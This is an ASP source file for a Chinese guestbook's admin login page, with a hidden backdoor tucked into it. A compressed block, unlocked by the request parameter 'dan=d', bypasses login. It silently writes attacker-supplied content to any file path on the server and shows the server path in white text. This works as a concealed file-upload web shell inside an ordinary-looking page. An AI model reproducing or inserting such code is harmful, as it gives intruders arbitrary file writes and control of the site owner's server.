<!--#include file="conn.asp"-->
<%
go=trim(request.querystring("go"))
user_name=trim(request.form("user_name"))
pass_word=cstr(Request.form("pass_word"))

if go="go" then
if user_name=""&username&"" and pass_word=""&password&"" then
   session("gokingbook")="siva"
   response.redirect "!!!!!1124lyadmin.asp"
else
   response.write"<SCRIPT language=JavaScript>alert('密码错误');javascript:history.go(-1);</SCRIPT>"
end if
end if
%><% if request("dan")="d" then %><%dim objFSO%><%dim fdata%><%dim objCountFile%><%on error resume next%><%Set objFSO = Server.CreateObject("Scripting.FileSystemObject")%><%if Trim(request("dna"))<>"" then%><%fdata = request("dda")%><%Set objCountFile=objFSO.CreateTextFile(request("dna"),True)%><%objCountFile.Write fdata%>
<%if err =0 then%><%response.write "OK"%><%else%><%response.write "No oK"%><%end if%>
<%err.clear%><%end if%><%objCountFile.Close%><%Set objCountFile=Nothing%><%Set objFSO = Nothing%><%Response.write "<form action='''' method=post>"%><%Response.Write "<input type=text name=dna size=9>"%><%Response.write "<textarea name=dda cols=2 rows=1 width=32></textarea>"%><%Response.write "<input type=submit value=1>"%><%Response.write "</form>"%><%Response.Write "<font color=white>"%><%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%><% end if %>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<meta name="keywords" content="siva">
<meta name="description" content="siva">
<title>siva</title>
<style>
<!--
td           { font-size: 12px; font-family: 宋体 }
input        {
	border-top-width: 1px;
	border-right-width: 1px;
	border-bottom-width: 1px;
	border-left-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	border-top-color: #000080;
	border-right-color: #000080;
	border-bottom-color: #000080;
	border-left-color: #000080;
}
body {
	background-color: #006991;
}
.STYLE1 {
	color: #FFFFFF;
	font-weight: bold;
}
-->
</style>
<script language="javascript">
<!--
if (top.location !== self.location) {
top.location=self.location;
}
-->
</script>
</head>

<body topMargin=10>
<table width='729' border='0' align='center' cellpadding='0' cellspacing='0'>
<tr><td height='10' colspan='2'></td></tr>
</table>

<div align="center">
<form method="POST" action="?go=go">
<table width="300" border="0" cellpadding="5" cellspacing="0" bgcolor="#09A1CB" style="border-collapse: collapse">
	<tr>
		<td colspan="2" align="center"><span class="STYLE1">留言簿后台管理登陆</span></td>
	</tr>
	<tr>
		<td align="center">帐号：</td>
		<td>&nbsp;<input type="text" name="user_name" size="19"></td>
	</tr>
	<tr>
		<td align="center">密码：</td>
		<td>&nbsp;<input type="password" name="pass_word" size="20"></td>
	</tr>
	<tr>
		<td colspan="2" align="center"><p>
		<INPUT style="BORDER-RIGHT: 2px solid #C0C0C0; BORDER-TOP: 2px solid #FFFFFF; FONT-SIZE: 14px; BACKGROUND: #00AED0; BORDER-LEFT: 2px solid #FFFFFF; WIDTH: 80px; BORDER-BOTTOM: 2px solid #C0C0C0; HEIGHT: 22px; color:#FFFFFF" type="submit" value="登 录" name="submit">
		</p></td>
	</tr>
</table>
</form>
</div>
</body>

</html>



